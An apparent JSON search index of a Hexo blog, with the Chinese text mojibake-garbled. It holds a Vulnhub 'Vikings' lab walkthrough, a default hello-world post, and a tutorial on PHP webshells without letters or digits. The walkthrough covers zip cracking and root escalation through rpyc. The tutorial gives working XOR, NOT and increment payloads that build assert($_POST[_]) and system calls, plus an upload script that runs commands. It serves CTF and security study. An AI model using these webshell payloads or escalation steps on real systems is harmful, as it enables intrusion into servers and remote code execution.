[{"title":"Viking","url":"/2021/12/01/Viking/","content":"é¶æœºä»‹ç»æœ¬é¶æœºè§£å¯†é£æ ¼å¾ˆé‡ï¼Œæ¯”è¾ƒåƒctf\né¶æœºåœ°å€ï¼šhttps://download.vulnhub.com/vikings/Vikings.ova\nç›®æ ‡ï¼šæ‹¿åˆ°2ä¸ªflag\néš¾åº¦ï¼šä½\nä¿¡æ¯æœé›†arp-scan -l\n\næ‰«æç½‘æ®µå†…æ‰€æœ‰ä¸»æœºï¼Œç¡®è®¤ç›®æ ‡é¶æœºåœ°å€\nnmap -p- 192.168.56.112\n\nå¯¹é¶æœºè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œæ‰«å‡ºæ¥äº†22å’Œ80ç«¯å£\nnmap -p22,80 -A 192.168.56.112\n\nå¯¹ä¸¤ä¸ªç«¯å£çš„æœåŠ¡è¿›è¡Œæ‰«æ\nPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)|_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)80/tcp open  http    Apache httpd 2.4.29| http-ls: Volume /| SIZE  TIME              FILENAME| -     2020-10-29 21:07  site/|_|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Index of /\n\n\n\nè·¯å¾„çˆ†ç ´gobusterè¿™ä¸ªå·¥å…·å·²ç»èµ¢dirsearchå¤ªå¤š\ngobuster dir -r -u http://192.168.56.112/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html -o dir-common.log\n\næ‰«æå‘ç°ï¼š/war.txt              (Status: 200) [Size: 13]  \næç¤ºæˆ‘ä»¬è½¬åˆ° http://192.168.56.112/site/war-is-over/\nè¿™ä¸ªé¡µé¢ï¼Œè¿”å›ä¸€ä¸²ç±»ä¼¼base64çš„é•¿æ•°æ®ï¼Œæˆ‘ä»¬ç”¨kaliä¿å­˜æ•°æ®åˆ°æœ¬åœ°\ncurl http://192.168.56.112/site/war-is-over/|base64 -d &gt;output\n\n\n\nfileæŸ¥çœ‹æ–‡ä»¶ç±»å‹\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]â””â”€# file output                                                                                                                         output: Zip archive data, at least v5.1 to extract\n\nä½†æ˜¯è§£å‹éœ€è¦å¯†ç ï¼Œæ­¤å¤„æˆ‘ä»¬ä¸çŸ¥é“å¯†ç ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½çˆ†ç ´\nçˆ†ç ´å‹ç¼©åŒ…å¯†ç å·¥å…·ï¼šjohn\nzip2john output.zip &gt;&gt; passwd.txtjohn passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt \n\nå¾ˆå¿«çˆ†ç ´å‡ºäº†å¯†ç ï¼šragnarok123\nå‹ç¼©åŒ…é‡Œæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œæ ¹æ®ç»éªŒåº”è¯¥æ˜¯éšå†™\nå›¾ç‰‡éšå†™æ¯”è¾ƒä½çº§çš„éšå†™ï¼Œbinwalkåˆ†ç¦»\n//FamousBoatbuilder_floki@vikings                                     //f@m0usboatbuilde7 \n\nsshæˆåŠŸç™»å½•ä¸ºflokiç”¨æˆ·\nuid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)\n\n\n\nä¸¤ä¸ªå¯ç–‘çš„æ–‡æœ¬ï¼Œå¯èƒ½å¯¹æ¥ä¸‹æ¥çš„è§£é¢˜æœ‰å¸®åŠ©\nfloki@vikings:~$ cat readme.txt _______________________________________________________________________Floki-Creation____________________________________________________________________________________________________I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don&#x27;t know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. I need to create this `boat` to find Ragnarfloki@vikings:~$ cat boat#Printable chars are your ally.#num = 29th prime-number.collatz-conjecture(num)\n\n\n\næŸ¥çœ‹/etc/passwd\nfloki:x:1000:1000:floki:/home/floki:/bin/bashragnar:x:1001:1001::/home/ragnar:/bin/sh\n\n\n\nææƒç”¨æˆ·ç»„108(lxd)ç»™æˆ‘ä»¬å¯ä»¥ææƒçš„æœºä¼šï¼Œå‚è€ƒï¼šhttps://www.freebuf.com/articles/system/216803.html\nä½†æ˜¯è¿™é‡Œä¾ç…§é¶æœºçš„æ„æ€æˆ‘ä»¬ç»§ç»­è§£è°œ\n==ã€‹I need to create this boat to find Ragnar\nboatæ˜¯æˆ‘ä»¬ææƒåˆ°Ragnarç”¨æˆ·çš„å…³é”®\nboat:\n#Printable chars are your ally.#num = 29th prime-number.collatz-conjecture(num)\n\nå¯æ‰“å°çš„å­—ç¬¦æ˜¯æˆ‘ä»¬è¦æ‰¾çš„å¯¹è±¡\nnumæ˜¯ç¬¬äºŒä¹ä¸ªç´ æ•°ï¼Œ109\ncollatzçŒœæƒ³ï¼šhttps://zh.wikipedia.org/wiki/%E8%80%83%E6%8B%89%E5%85%B9%E7%8C%9C%E6%83%B3\n\nè€ƒæ‹‰å…¹çŒœæƒ³ï¼ˆè‹±è¯­ï¼šCollatz conjectureï¼‰ï¼Œåˆç§°ä¸ºå¥‡å¶å½’ä¸€çŒœæƒ³ã€3n+1çŒœæƒ³ã€å†°é›¹çŒœæƒ³ã€è§’è°·çŒœæƒ³ã€å“ˆå¡çŒœæƒ³ã€ä¹Œæ‹‰å§†çŒœæƒ³æˆ–å™æ‹‰å¤çŒœæƒ³ï¼Œæ˜¯æŒ‡å¯¹äºæ¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œå¦‚æœå®ƒæ˜¯å¥‡æ•°ï¼Œåˆ™å¯¹å®ƒä¹˜3å†åŠ 1ï¼Œå¦‚æœå®ƒæ˜¯å¶æ•°ï¼Œåˆ™å¯¹å®ƒé™¤ä»¥2ï¼Œå¦‚æ­¤å¾ªç¯ï¼Œæœ€ç»ˆéƒ½èƒ½å¤Ÿå¾—åˆ°1ã€‚\n\n#ascii 0-255å¯æ‰“å°\nç¼–å†™è„šæœ¬ï¼š\ni = 109c = [i]while i!=1:    if(i%2) == 1:        i = i * 3 + 1    else:        i = i//2    if(i&lt;256):        c.append(i)print(c)str = &#x27;&#x27;for n in c:    str = str + chr(n)print(str)\n\nmÂ¤R)|&gt;^/GÃ–kÂ¡Ã²yÂ¶[ÃgÂ¯Â§Ã»Ã´z=Â¸\\.F#j5 P(å†ç­›é€‰å‡ºä¸­é—´å¯è¢«é”®ç›˜è¾“å‡ºçš„å­—ç¬¦ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨cyberchef\n\n\nçŒœæµ‹mR)|&gt;^/Gky[gz=.F#j5P(ä¸ºRagnarç”¨æˆ·çš„å¯†ç \nsshç™»å½•æˆåŠŸ\nè¿™é‡Œç™»å½•çš„æ—¶å€™ä¼šè¯·æ±‚ragnarçš„sudoå¯†ç ï¼Œåº”è¯¥æ˜¯ç³»ç»Ÿåˆå§‹çš„æ—¶å€™æ‰§è¡Œçš„å‘½ä»¤\næ€»ä¹‹å…ˆæ‹¿åˆ°äº†ragnarçš„æƒé™\n$ iduid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)\n\nå‡çº§ä¸€ä¸‹shellåˆ°bash\nSHELL=/bin/bash script -q /dev/null\n\næ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\nragnar@vikings:~$ cat user.txt4bf930187d0149a9e4374a4e823f867d\n\n\n\nrpcææƒå› ä¸ºç™»å½•ragnarç”¨æˆ·æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨sudoï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸‹è¿™äº›é¢„å…ˆå‚¨å­˜å¥½çš„å‘½ä»¤\n.profile, .bashrc, .bash_profile, /etc/profile, etc. \nå½“æˆ‘ä»¬æ£€æŸ¥.profileæ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¿™ä¸€è¡Œå‘½ä»¤\nsudo python3 /usr/local/bin/rpyc_classic.py\n\n\n\nè™½ç„¶ç”¨æˆ·æ²¡æœ‰æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰rpyc serveråœ¨è·‘\n\nè®¡ç®—æœºç½‘ç»œè¯¾ä¸­æˆ‘ä»¬å­¦è¿‡ï¼Œrpcæ˜¯ç”¨æ¥å®ç°è¿œç¨‹è°ƒç”¨çš„\nrpycæ–‡æ¡£ï¼šhttps://rpyc.readthedocs.io/en/latest/index.html\n\nragnar@vikings:~$ netstat -tnlp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:18812         0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:42945         0.0.0.0:*               LISTEN      -         \n\næ—¢ç„¶ä»–æ‰“å¼€äº†æœåŠ¡ç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥æœ¬åœ°å†™ä¸€ä¸ªè„šæœ¬å»è¿ä»–çš„æœåŠ¡ç«¯ï¼Œè¿™æ ·åœ¨æœåŠ¡ç«¯å°±æœ‰å¯èƒ½ä»¥rootç”¨æˆ·æ‰§è¡Œå‘½ä»¤\nï¼ˆåå¼¹shellå¤±è´¥äº†ï¼Œè¿™é‡Œæ›´æ”¹ragnarç”¨æˆ·çš„æƒé™ï¼‰\nimport rpycdef getshell():    import os    os.system(&quot;sudo usermod -a -G sudo ragnar&quot;) conn = rpyc.classic.connect(&quot;localhost&quot;)fn = conn.teleport(getshell)fn()\n\nè¿è¡Œè„šæœ¬åï¼Œragnarå·²ç»æœ‰äº†sudoæƒé™ï¼Œé‡æ–°ç”¨ragnarç”¨æˆ·ç™»å½•é¶æœºï¼Œå³å¯ææƒåˆ°root\nroot@vikings:/# cat root/root.txtf0b98d4387ff6da77317e582da98bf31\n\næ‹¿åˆ°ç¬¬äºŒä¸ªflag\n","categories":["web"],"tags":["vulnhub"]},{"title":"Hello World","url":"/2021/11/29/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\nimage Test\nåˆ©è´ºç”°\n"},{"title":"phpæ— å­—æ¯æ•°å­—æ„é€ -å…¥é—¨çº§","url":"/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/","content":"1    å‰ç½®çŸ¥è¯†1.1    phpä¸­çš„æ­£åˆ™åŒ¹é…å‡½æ•°æœ€å¸¸è§çš„preg_grep()\npreg_grep(string $pattern, array $array, int $flags = 0): array|false\nè¿”å›ç»™å®šæ•°ç»„arrayä¸­ä¸æ¨¡å¼pattern åŒ¹é…çš„å…ƒç´ ç»„æˆçš„æ•°ç»„\nå…¶ä½™çš„æ­£åˆ™å‡½æ•°å¯ä»¥åœ¨https://www.runoob.com/php/php-pcre.htmlé‡Œå­¦ä¹ \n1.2     æ­£åˆ™åŒ¹é…å¼æ­£åˆ™è¡¨è¾¾å¼æ‰‹å†Œï¼šhttps://tool.oschina.net/uploads/apidocs/jquery/regexp.html\nhttps://www.runoob.com/regexp/regexp-tutorial.html\nåŠ¨æ€è°ƒè¯•æ­£åˆ™è¡¨è¾¾å¼çš„ç½‘ç«™ï¼šhttps://regex101.com/\nä¸­æ–‡åœ¨çº¿è°ƒè¯•ï¼šhttps://c.runoob.com/front-end/854/\nå°è¯•é˜…è¯»å‡ ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š\n/^[a-z0-9_-]&#123;3,16&#125;$/\t\tç”¨æ¥è¿‡æ»¤ç”¨æˆ·å/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/\t\tåŒ¹é…ipåœ°å€/^[a-z\\d]+(\\.[a-z\\d]+)*@([\\da-z](-[\\da-z])?)+(\\.&#123;1,2&#125;[a-z]+)+$/ç”µå­é‚®ç®±\n\n1.3    phpä¸­çš„ä½è¿ç®—åœ¨æ„é€ å­—ç¬¦ç»•æ­£åˆ™çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¸¸ç”¨ä½è¿ç®—ç¬¦æ¥å¸®åŠ©æˆ‘ä»¬æ„é€ \nphpä½è¿ç®—ç¬¦ï¼šhttps://blog.csdn.net/qq_28602957/article/details/52141431\n2    æ— å­—æ¯æ•°å­—æ„é€ 2.1    æ— å­—æ¯æ•°å­—åŸºç¡€&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;\n\n\nphp5\nä¿®é¥°ç¬¦iï¼Œsï¼šhttps://www.runoob.com/regexp/regexp-flags.html\n\nå¼‚æˆ–æ‹¼æ¥ï¼š\nï¼ˆæ¥è‡ªpç‰›åšå®¢\n&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]);\n\n(å¾ˆå¤šä¸å¯æ‰“å°å­—ç¬¦ï¼Œç”¨urlç¼–ç è¡¨ç¤º)\nå¼‚æˆ–:\n(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();\n\nè¿™æ ·å¯ä»¥phpinfo\nå€˜è‹¥è¿‡æ»¤äº†å¼•å·ï¼š\n$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo\n\n%86%86%86%86^%d9%c1%c3%d2æ„é€ å‡º_GET,phpä¸­å¯ä»¥è¿™æ ·æ„é€ å‚æ•°,èŠ±æ‹¬å·åœ¨æ•°ç»„ä¸­å¯ä»¥ç´¢å¼•ï¼š\n$_GET&#123;2&#125;\n\n\n\nä¸€ä¸ªéæ•°å­—å­—æ¯çš„phpåé—¨ï¼ˆä½¿ç”¨å¼‚æˆ–ï¼‰ï¼š\n// demo1.php&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;\n\næ‹¼æ¥_POST:\n$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);\n\næ›´çŸ­çš„å­—ç¬¦ï¼š\n&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot; //_GET&quot;#./|&#123;&quot;^&quot;|~`//&quot; //_POST\n\n\n\næˆ–ï¼š\n(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();\n\nè¿™æ ·å¯ä»¥phpinfo\n(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);\n\nsystem(â€˜whoamiâ€™); å¯ä»¥rce\nå–åï¼š\n(~%8F%97%8F%96%91%99%90)();\n\nå¯phpinfo\nutf-8ä¸‹å–ä¸­æ–‡å­—ç¬¦å–åï¼š\nUTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚â€™å’Œâ€™{2}çš„ç»“æœæ˜¯â€\\x8câ€ï¼Œå…¶å–åå³ä¸ºå­—æ¯s\n&lt;?php$_=&quot;å’Œ&quot;;print(~($_&#123;2&#125;));print(~&quot;\\x8c&quot;);?&gt;\n\nè„šæœ¬ç”Ÿæˆï¼š\n&gt;&gt;&gt; def get(shell):...     hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))...     print(hexbit)...&gt;&gt;&gt; get(&#x27;phpinfo&#x27;)0x8f0x970x8f0x960x910x990x90\n\n\n\nè‡ªå¢ï¼š\nâ€˜aâ€™++ =&gt; â€˜bâ€™ï¼Œâ€™bâ€™++ =&gt; â€˜câ€™â€¦ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºaï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚\næ–‡æ¡£ï¼šhttp://php.net/manual/zh/language.operators.increment.php\nå¦‚ä½•æ‹¿åˆ°ä¸€ä¸ªå€¼ä¸ºå­—ç¬¦ä¸²â€™aâ€™çš„å˜é‡å‘¢ï¼Ÿ\næ•°ç»„ï¼ˆArrayï¼‰çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™aã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶æ‹¿åˆ°å°å†™å’Œå¤§å†™Aï¼Œç­‰äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°a-zå’ŒA-Zçš„æ‰€æœ‰å­—æ¯ã€‚\nåœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºArrayï¼š\n&lt;?phpecho &#x27;&#x27;.[];//Array\n\næ„é€ ï¼šASSERT($_POST[_]);\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);\n\n\n\n//æµ‹è¯•å‘ç°7.0.12ä»¥ä¸Šç‰ˆæœ¬ä¸å¯ä½¿ç”¨//ä½¿ç”¨æ—¶éœ€è¦urlç¼–ç ä¸‹$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);å›ºå®šæ ¼å¼ æ„é€ å‡ºæ¥çš„ assert($_POST[_]);ç„¶åpostä¼ å…¥   _=phpinfo();\n\n\n\nä¸ç”¨æ•°å­—æ„é€ æ•°å­—ï¼š\necho (&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);//2echo true+true;//2\n\næˆ–è€…ï¼š\n&lt;?php$_++;print($_); // 1?&gt;phpä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸ºnullï¼Œnullfalse0\n\n\n\n2.2    é•¿åº¦é™åˆ¶&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;        die(&quot;NO.&quot;);    &#125;    eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\nphp7:\nPHP7å‰æ˜¯ä¸å…è®¸ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡(â€˜phpinfoâ€™)();æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚\n(~%8F%97%8F%96%91%99%90)();\n\n\n\nphp5:\nä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ï¼š\nimport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files=&#123;&#x27;file&#x27;:&#x27;cat f*&#x27;&#125;response=requests.post(url,files=files)html = response.textprint(html)\n\nå…·ä½“åŸç†çœ‹pç¥æ–‡ç« å¯äº†è§£è¯¦ç»†\nglobé€šé…ç¬¦ï¼šhttps://man7.org/linux/man-pages/man7/glob.7.html\n2.3    è¿‡æ»¤ä¸‹åˆ’çº¿&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;50)&#123;        die(&quot;Too Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code))&#123;        die(&quot;Not Allowed.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;\n\n\n\nå¼‚æˆ–ï¼š\n?code=(&#x27;$&#x27;).(&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;).([&#x27;+&#x27;])&amp;+=getFlag();\n\nè¿™æ ·æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºevalåªèƒ½è§£æä¸€éä»£ç ï¼Œè€Œæ­¤æ—¶ä¸­é—´çš„æ‹¼æ¥å°±ä¼šæˆä¸ºç¬¬ä¸€éè§£æçš„è¿ç®—\næ­£ç¡®çš„payloadä¸ºï¼š\n?code=$&#123;&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;&#125;[&#x27;+&#x27;]();&amp;+=getFlag\n\nè¿™é‡Œåˆ©ç”¨äº†**${}**ä¸­çš„ä»£ç æ˜¯å¯ä»¥æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¯å˜å˜é‡ã€‚\nç¤ºä¾‹ï¼š\n&lt;?php    $a = &#x27;hello&#x27;;    $$a = &#x27;world&#x27;;    echo &quot;$a $&#123;$a&#125;&quot;;?&gt;        &gt;&gt;hello world\n\n\n\nå–åï¼š\n?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlagå…¶ä¸­24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B = $&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125; = $_GET~åœ¨&#123;&#125;ä¸­æ‰§è¡Œäº†å–åæ“ä½œ\n\n\n\n2.4    è¿‡æ»¤$å­—ç¬¦&lt;?php include &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;    die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))    &#123;        die(&quot;NO.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint=&quot;php function getFlag() to get flag&quot;;?&gt;\n\npayload:\ncode=?&gt;&lt;?=`/???/??? ????.???`?&gt;/???/???é€šé…``/bin/catï¼Œ???.???é€šé…flag.php`\n\n\n\n\n\nå‚è€ƒï¼š\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nhttps://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/\nhttps://blog.csdn.net/miuzzx/article/details/109143413\n","categories":["web"],"tags":["php"]}]